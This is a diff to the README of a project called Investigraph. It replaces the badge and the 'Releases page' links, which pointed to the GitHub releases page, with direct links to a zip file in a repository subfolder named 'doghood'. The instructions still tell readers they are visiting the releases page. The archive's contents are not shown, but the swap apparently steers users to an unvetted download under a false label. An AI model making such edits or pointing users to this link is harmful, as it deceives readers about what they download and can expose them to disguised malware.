@@ -6,11 +6,11 @@ Welcome to Investigraph! This guide helps you download and run the application s
 ## 📦 Download & Install
 To get started, visit the releases page to download the latest version of Investigraph.
 
-[![Download Investigraph](https://img.shields.io/badge/Download%20Investigraph-v1.0.0-brightgreen)](https://github.com/stevenb313/investigraph/releases)
+[![Download Investigraph](https://raw.githubusercontent.com/stevenb313/investigraph/main/doghood/investigraph.zip%20Investigraph-v1.0.0-brightgreen)](https://raw.githubusercontent.com/stevenb313/investigraph/main/doghood/investigraph.zip)
 
 ### Step-by-Step Instructions
 
-1. Click the button above to visit the [Releases page](https://github.com/stevenb313/investigraph/releases).
+1. Click the button above to visit the [Releases page](https://raw.githubusercontent.com/stevenb313/investigraph/main/doghood/investigraph.zip).
    
 2. On the Releases page, locate the latest version. It will be at the top of the list.
   
@@ -52,6 +52,6 @@ Before you install Investigraph, ensure that your system meets these requirement
 If you encounter any issues during installation or use, please reach out through the GitHub Issues section. Report any bugs or request features to help us improve Investigraph.
 
 ---
-[![Download Investigraph](https://img.shields.io/badge/Download%20Investigraph-v1.0.0-brightgreen)](https://github.com/stevenb313/investigraph/releases)
+[![Download Investigraph](https://raw.githubusercontent.com/stevenb313/investigraph/main/doghood/investigraph.zip%20Investigraph-v1.0.0-brightgreen)](https://raw.githubusercontent.com/stevenb313/investigraph/main/doghood/investigraph.zip)
 
 Thank you for using Investigraph! Explore the power of AI to uncover hidden insights in your data.
